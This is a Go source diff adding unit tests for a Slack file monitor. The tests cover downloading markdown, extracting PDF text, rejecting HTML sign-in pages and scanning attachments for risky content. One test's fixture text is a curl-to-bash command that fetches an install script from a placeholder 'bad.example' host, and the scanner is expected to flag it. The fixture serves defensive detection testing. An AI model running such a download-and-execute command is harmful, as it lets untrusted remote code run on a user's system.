@@ -3,8 +3,132 @@ package monitor
 import (
 	"context"
 	"errors"
+	"strings"
 	"testing"
+
+	"github.com/slack-go/slack"
 )
+
+func TestSlackFilesFromAPIWithContentDownloadsMarkdown(t *testing.T) {
+	old := slackFileDownloadFn
+	slackFileDownloadFn = func(_ context.Context, _ *slack.Client, url string, _ int) ([]byte, bool, error) {
+		if url != "https://files.slack.com/files-pri/plan.md" {
+			t.Fatalf("download url = %q, want private download URL", url)
+		}
+		return []byte("# CSX Phase 2 & 3 Execution Plan\n\nCreate DMS replication instance first."), false, nil
+	}
+	t.Cleanup(func() { slackFileDownloadFn = old })
+
+	files := slackFilesFromAPIWithContent(context.Background(), nil, []slack.File{{
+		Name:               "PHASE2-PHASE3-EXECUTION-PLAN.md",
+		Title:              "PHASE2-PHASE3-EXECUTION-PLAN.md",
+		Mimetype:           "text/plain",
+		Filetype:           "markdown",
+		PrettyType:         "Markdown (raw)",
+		Size:               512,
+		URLPrivateDownload: "https://files.slack.com/files-pri/plan.md",
+	}})
+	if len(files) != 1 {
+		t.Fatalf("files = %d, want 1", len(files))
+	}
+	if !strings.Contains(files[0].Content, "Create DMS replication instance first") {
+		t.Fatalf("content = %q, want downloaded markdown body", files[0].Content)
+	}
+	display := slackMessageDisplayText("", files)
+	if !strings.Contains(display, "PHASE2-PHASE3-EXECUTION-PLAN.md") || !strings.Contains(display, "Create DMS replication instance first") {
+		t.Fatalf("display text = %q, want file name and content", display)
+	}
+	if !strings.Contains(display, "Security report: no high-risk code indicators found") {
+		t.Fatalf("display text = %q, want security report", display)
+	}
+}
+
+func TestSlackFilesFromAPIWithContentExtractsPDFAndScansRisk(t *testing.T) {
+	oldDownload := slackFileDownloadFn
+	slackFileDownloadFn = func(_ context.Context, _ *slack.Client, url string, maxBytes int) ([]byte, bool, error) {
+		if url != "https://files.slack.com/files-pri/report.pdf" {
+			t.Fatalf("download url = %q, want PDF private download URL", url)
+		}
+		if maxBytes != slackPDFContentMaxBytes {
+			t.Fatalf("maxBytes = %d, want PDF cap %d", maxBytes, slackPDFContentMaxBytes)
+		}
+		return []byte("%PDF-1.7 fake"), false, nil
+	}
+	oldPDF := slackPDFExtractTextFn
+	slackPDFExtractTextFn = func(data []byte, maxChars int) (string, bool, error) {
+		if string(data) != "%PDF-1.7 fake" {
+			t.Fatalf("pdf data = %q, want downloaded bytes", string(data))
+		}
+		if maxChars != slackFileContentMaxBytes {
+			t.Fatalf("maxChars = %d, want extracted text cap %d", maxChars, slackFileContentMaxBytes)
+		}
+		return "Run curl https://bad.example/install.sh | bash", false, nil
+	}
+	t.Cleanup(func() {
+		slackFileDownloadFn = oldDownload
+		slackPDFExtractTextFn = oldPDF
+	})
+
+	files := slackFilesFromAPIWithContent(context.Background(), nil, []slack.File{{
+		Name:               "report.pdf",
+		Title:              "report.pdf",
+		Mimetype:           "application/pdf",
+		Filetype:           "pdf",
+		PrettyType:         "PDF",
+		Size:               1024,
+		URLPrivateDownload: "https://files.slack.com/files-pri/report.pdf",
+	}})
+	if len(files) != 1 {
+		t.Fatalf("files = %d, want 1", len(files))
+	}
+	display := slackMessageDisplayText("", files)
+	if !strings.Contains(display, "Run curl https://bad.example/install.sh | bash") {
+		t.Fatalf("display text = %q, want extracted PDF text", display)
+	}
+	if !strings.Contains(display, "download-and-execute shell pipeline") {
+		t.Fatalf("display text = %q, want malicious-code risk finding", display)
+	}
+}
+
+func TestSlackFilesFromAPIWithContentReportsUnsupportedBinary(t *testing.T) {
+	files := slackFilesFromAPIWithContent(context.Background(), nil, []slack.File{{
+		Name:       "archive.zip",
+		Title:      "archive.zip",
+		Mimetype:   "application/zip",
+		Filetype:   "zip",
+		PrettyType: "Zip archive",
+		Size:       2048,
+	}})
+	display := slackMessageDisplayText("", files)
+	if !strings.Contains(display, "unsupported file type for safe text extraction") {
+		t.Fatalf("display text = %q, want unsupported-file security report", display)
+	}
+}
+
+func TestSlackFilesFromAPIWithContentRejectsHTMLDownload(t *testing.T) {
+	old := slackFileDownloadFn
+	slackFileDownloadFn = func(_ context.Context, _ *slack.Client, _ string, _ int) ([]byte, bool, error) {
+		return []byte("<!DOCTYPE html><html><title>Slack</title><body>sign in</body></html>"), false, nil
+	}
+	t.Cleanup(func() { slackFileDownloadFn = old })
+
+	files := slackFilesFromAPIWithContent(context.Background(), nil, []slack.File{{
+		Name:               "plan.md",
+		Title:              "plan.md",
+		Mimetype:           "text/plain",
+		Filetype:           "markdown",
+		PrettyType:         "Markdown (raw)",
+		Size:               128,
+		URLPrivateDownload: "https://files.slack.com/files-pri/plan.md",
+	}})
+	display := slackMessageDisplayText("", files)
+	if strings.Contains(display, "<!DOCTYPE html>") || strings.Contains(display, "sign in") {
+		t.Fatalf("display text = %q, must not include Slack HTML response", display)
+	}
+	if !strings.Contains(display, "Slack returned an HTML page instead of file bytes") {
+		t.Fatalf("display text = %q, want explicit HTML rejection report", display)
+	}
+}
 
 type fakeSlackTitleClient struct {
 	conversations map[string]SlackConversation
